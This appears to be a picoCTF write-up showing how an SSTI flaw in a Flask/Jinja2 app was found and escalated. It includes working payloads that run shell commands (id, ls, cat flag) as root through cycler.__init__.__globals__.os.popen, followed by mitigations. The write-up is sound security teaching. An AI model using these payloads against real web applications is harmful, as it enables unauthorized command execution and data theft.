# writeup

![Platform](https://img.shields.io/badge/Platform-picoCTF-orange?style=for-the-badge) ![Topic](https://img.shields.io/badge/Topic-Web_Exploitation-red?style=for-the-badge) ![Status](https://img.shields.io/badge/Status-Solved-brightgreen?style=for-the-badge)

## WriteUp - SSTI Challenge

> Server-Side Template Injection leading to Remote Code Execution

***

### Challenge Overview

This challenge involved identifying and exploiting a Server-Side Template Injection (SSTI) vulnerability in a Flask/Jinja2 web application.

By abusing the template engine, it was possible to:

* execute Python expressions,
* access internal Flask objects,
* achieve Remote Code Execution (RCE),
* and ultimately read the flag directly from the server.

The challenge demonstrates how dangerous SSTI vulnerabilities can become when user input is rendered unsafely.

***

### Initial Recon

After opening the application homepage, the page appeared simple and accepted user-controlled input.

Initial application view:

![homepage](<../../.gitbook/assets/1-homepage (7).png>)

Since the challenge looked template-related, I decided to test whether the application evaluated template expressions.

***

### Testing for SSTI

The first payload used was:

```jinja2
{{7*7}}
```

Payload injection attempt:

![trying-ssti](../../.gitbook/assets/2-trying-SSTI.png)

The application returned:

```
49
```

Confirmed SSTI execution:

![confirmed-ssti](../../.gitbook/assets/3-confirmed-SSTI.png)

This confirmed that the server was evaluating Jinja2 template expressions directly.

At this point, the vulnerability was identified as:

* Server-Side Template Injection (SSTI)

***

### Identifying the Template Engine

To gather more information about the backend framework, I used:

```jinja2
{{config}}
```

The response exposed Flask configuration objects:

![config](../../.gitbook/assets/4-result-\{{config\}}.png)

This confirmed:

* Flask framework
* Jinja2 template engine

Once Flask/Jinja2 was confirmed, the next objective became achieving code execution.

***

### Escalating to Remote Code Execution

Jinja2 exposes internal Python objects that can sometimes be abused to reach dangerous modules such as `os`.

The following payload was used:

```jinja2
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

The application returned:

```
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed successful Remote Code Execution (RCE) with root privileges.

***

### Enumerating the Server

After obtaining RCE, I listed the files in the current directory using:

```jinja2
{{cycler.__init__.__globals__.os.popen('ls').read()}}
```

The result revealed several files:

```
__pycache__
app.py
flag
requirements.txt
```

Directory enumeration:

![enumeration](../../.gitbook/assets/5-almost-found-flag.png)

At this point, the flag file had been identified.

***

### Reading the Flag

Finally, the following payload was used to read the flag directly from the server:

```jinja2
{{cycler.__init__.__globals__.os.popen('cat flag').read()}}
```

Successful payload execution:

![flag](../../.gitbook/assets/6-payload-just-worked.png)

The flag was successfully retrieved from the server.

***

### Vulnerability Analysis

This challenge demonstrates a classic SSTI vulnerability caused by rendering unsanitized user input directly inside a Jinja2 template.

The danger of SSTI is that template engines often expose:

* Python internals
* global objects
* built-in functions
* dangerous modules

In this case, it was possible to reach:

* Python globals
* the `os` module
* shell command execution

This transformed a simple template injection into full Remote Code Execution.

***

### Concepts Practiced

* Server-Side Template Injection (SSTI)
* Flask/Jinja2 exploitation
* Python object traversal
* Remote Code Execution (RCE)
* Linux command execution
* Enumeration
* File disclosure

***

### Mitigations

Proper defenses against SSTI vulnerabilities include:

* Never render raw user input directly in templates
* Use safe rendering methods
* Sanitize user-controlled input
* Sandbox template environments
* Restrict dangerous Python object access
* Apply strict server-side validation

***

### Conclusion

This challenge provided an excellent demonstration of how a simple SSTI vulnerability can evolve into full Remote Code Execution.

By identifying template injection, confirming the Flask/Jinja2 environment, and leveraging internal Python objects, it was possible to execute arbitrary commands as root and retrieve the flag directly from the server.

The challenge reinforces how critical secure template rendering is in modern web applications.
